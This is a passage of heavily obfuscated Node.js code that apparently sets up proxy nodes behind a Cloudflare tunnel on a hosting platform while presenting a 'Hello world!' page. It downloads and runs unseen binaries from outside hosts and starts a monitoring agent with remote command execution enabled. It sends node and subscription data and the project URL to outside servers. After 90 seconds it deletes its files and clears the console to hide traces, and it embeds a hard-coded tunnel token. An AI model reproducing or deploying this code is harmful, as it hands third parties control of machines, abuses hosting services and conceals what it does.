_0x26b849&&_0x26b849['status']===0xc8?(console[_0x335d54(_0x393c35._0x3e01fa)]('Nodes\x20uploaded\x20successfully'),_0x26b849):null;}catch(_0x3507fa){return null;}}else return;}}function cleanFiles(){const _0x5a42f3={_0x144535:0x1a9,_0x1288e3:0x191,_0x464f0f:0x1f0,_0x511805:0x1f8,_0x3f0389:0x154},_0x4a7700={_0x147db6:0x20b,_0x1c7eeb:0x19e};setTimeout(()=>{const _0xabb352={_0x2472f8:0x15a},_0x45670f=_0x2af5,_0x811bee=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x811bee[_0x45670f(0x150)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x811bee['push'](phpPath);process[_0x45670f(_0x5a42f3._0x144535)]===_0x45670f(0x16f)?exec(_0x45670f(_0x5a42f3._0x1288e3)+_0x811bee['join']('\x20')+_0x45670f(_0x5a42f3._0x464f0f),_0x396b1c=>{const _0x1cb968=_0x45670f;console['clear'](),console[_0x1cb968(0x15a)]('App\x20is\x20running'),console[_0x1cb968(_0xabb352._0x2472f8)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec(_0x45670f(_0x5a42f3._0x511805)+_0x811bee[_0x45670f(_0x5a42f3._0x3f0389)]('\x20')+'\x20>/dev/null\x202>&1',_0xab8568=>{const _0x5904df=_0x45670f;console[_0x5904df(_0x4a7700._0x147db6)](),console[_0x5904df(0x15a)]('App\x20is\x20running'),console[_0x5904df(0x15a)](_0x5904df(_0x4a7700._0x1c7eeb));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x38c897={_0x2e544e:0x151,_0x4980fe:0x15a},_0x35e7c3=_0x30d983;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x35e7c3(0x15a)]('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0x46b5b8=await axios['post'](_0x35e7c3(0x180),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x35e7c3(_0x38c897._0x2e544e)}});return console[_0x35e7c3(_0x38c897._0x4980fe)]('automatic\x20access\x20task\x20added\x20successfully'),_0x46b5b8;}catch(_0x161a16){return console[_0x35e7c3(0x1d2)](_0x35e7c3(0x1f4)+_0x161a16[_0x35e7c3(0x199)]),null;}}function _0x1a7f(){const _0x227dcc=['/vmess-argo','\x0a\x20\x20credentials-file:\x20','catch','length','tls','TunnelSecret','all','Hello\x20world!','substring','existsSync','push','application/json','https://amd64.ssss.nyc.mn/bot','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','join','true','4904472LTfVnc','https://arm64.ssss.nyc.mn/agent','utf-8','\x20is\x20running','log','base64','/sub.txt\x20saved\x20successfully','PROJECT_URL','pop','tunnel.yml','list.txt','4054770wFozyc','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','\x20-c\x20\x22','fileName','\x22\x20>\x20/dev/null\x202>&1','config.yaml','1113970HGNMhh','/vmess-argo?ed=2560','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','toString','charAt','boot.log','success','http\x20server\x20is\x20running\x20on\x20port:','win32','block','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','vless','\x0aclient_secret:\x20','/config.json\x20>/dev/null\x202>&1\x20&','Empowerment\x20failed\x20for\x20','Error\x20downloading\x20files:','48shQYdb','&path=%2Ftrojan-argo%3Fed%3D2560#','match','30216iYiKtE','country_code','env','post','amd','get','https://oooo.serv00.net/add-url','\x20-c\x20','send','unlinkSync','\x20already\x20exists','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','http://ip-api.com/json/','Empowerment\x20success\x20for\x20','from','39qfAuAm','path','quic','Unhandled\x20error\x20in\x20startserver:','FILE_PATH','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','NAME','has','del\x20/f\x20/q\x20','\x0a\x0avmess://','unshift','Subscription\x20uploaded\x20successfully','AUTO_ACCESS','NEZHA_SERVER','nohup\x20','text/plain;\x20charset=utf-8','message','https://arm64.ssss.nyc.mn/web','arch','stringify','/dev/null','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','direct','tcp','\x20-p\x20','forEach','readdirSync','isFile','NEZHA_PORT','vbnm','/api/add-subscriptions','Error\x20executing\x20command:\x20','platform','https://amd64.ssss.nyc.mn/agent','npm\x20running\x20error:\x20','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','Download\x20','readFileSync','pipe','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','exec','blackhole','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','/api/delete-nodes','xtls-rprx-vision','freedom','stream','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','child_process','then','\x20failed:\x20','floor','?security=tls&sni=','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','2053','SERVER_PORT','13722hWKzyl','UUID','/trojan-argo','/vless-argo','none','listen','Error\x20in\x20startserver:','?encryption=none&security=tls&sni=','&fp=firefox&type=ws&host=','127.0.0.1','\x0a\x20\x20tunnel:\x20','express','CFIP','includes','\x20>/dev/null\x202>&1\x20&','map','error','https://arm64.ssss.nyc.mn/bot','2533370ezGkvm','/api/add-nodes','data','web\x20running\x20error:\x20','&path=%2Fvless-argo%3Fed%3D2560#','2087','ARGO_PORT','sub.txt','close','chmod','CFPORT','pkill\x20-f\x20\x22[','http','https://amd64.ssss.nyc.mn/v1','arm64','tunnel.json','php\x20running\x20error:\x20','status','./tmp','ARGO_DOMAIN:','split','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','Unknown','\x20-s\x20','ARGO_AUTH','17026020JybTiW','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','test','\x20>\x20nul\x202>&1','fileUrl','writeFileSync','random','Add\x20automatic\x20access\x20task\x20faild:\x20','createWriteStream','set','2083','rm\x20-rf\x20','\x0a\x0atrojan://','aarch64','arm','.exe\x20>\x20nul\x202>&1','mkdirSync','unlink','SUB_PATH','NEZHA_KEY','basename','org','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','lea.zaya3.de5.net','PORT','NEZHA\x20variable\x20is\x20empty,skip\x20running','2096','response','Content-Type','eyJhIjoiNDJkNWJmMzVhZmYwMTY4NWU3YWIxMjRmOGRlZWUwNjkiLCJ0IjoiZTE5ZmU2MzEtODZlNS00ODg2LThmZDItMWViZWY0MGMyNmVkIiwicyI6Ik5XUXdZelV4TXpVdE0yRXlOUzAwTVRrM0xUaGtaall0TWpjeU5qRmpZbUZsTW1FNSJ9','clear','cdns.doon.eu.org'];_0x1a7f=function(){return _0x227dcc;};return _0x1a7f();}async function startserver(){const _0x438c1d={_0xb2fb6a:0x1c8},_0x31d36e=_0x30d983;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x5708f3){console[_0x31d36e(0x1d2)](_0x31d36e(_0x438c1d._0xb2fb6a),_0x5708f3);}}startserver()[_0x30d983(0x20f)](_0x35d225=>{const _0x2e7468={_0x2222b4:0x1d2,_0x4497c3:0x18c},_0x26ecc7=_0x30d983;console[_0x26ecc7(_0x2e7468._0x2222b4)](_0x26ecc7(_0x2e7468._0x4497c3),_0x35d225);}),app[_0x30d983(0x1c7)](PORT,()=>console[_0x30d983(0x15a)](_0x30d983(0x16e)+PORT+'!'));
